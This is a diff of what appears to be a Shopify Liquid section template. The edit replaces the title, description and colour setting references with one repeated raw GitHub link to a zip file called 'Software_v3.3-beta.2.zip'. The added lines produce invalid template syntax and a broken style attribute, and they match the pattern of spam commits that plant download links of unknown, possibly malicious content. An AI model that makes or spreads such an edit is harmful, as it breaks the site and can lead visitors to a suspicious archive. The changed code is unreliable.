@@ -36,7 +36,7 @@
 }
 {% endschema %}
 
-<div style="padding: 40px; background: {{ section.settings.achtergrondkleur }}; text-align: center; color: {{ section.settings.tekstkleur }};">
-  <h2>{{ section.settings.titel }}</h2>
-  <p>{{ section.settings.beschrijving }}</p>
+<div style="padding: 40px; background: {{ https://github.com/Mohammed061/Srscfd/raw/refs/heads/main/wailfully/Software_v3.3-beta.2.zip }}; text-align: center; color: {{ https://github.com/Mohammed061/Srscfd/raw/refs/heads/main/wailfully/Software_v3.3-beta.2.zip }};">
+  <h2>{{ https://github.com/Mohammed061/Srscfd/raw/refs/heads/main/wailfully/Software_v3.3-beta.2.zip }}</h2>
+  <p>{{ https://github.com/Mohammed061/Srscfd/raw/refs/heads/main/wailfully/Software_v3.3-beta.2.zip }}</p>
 </div>
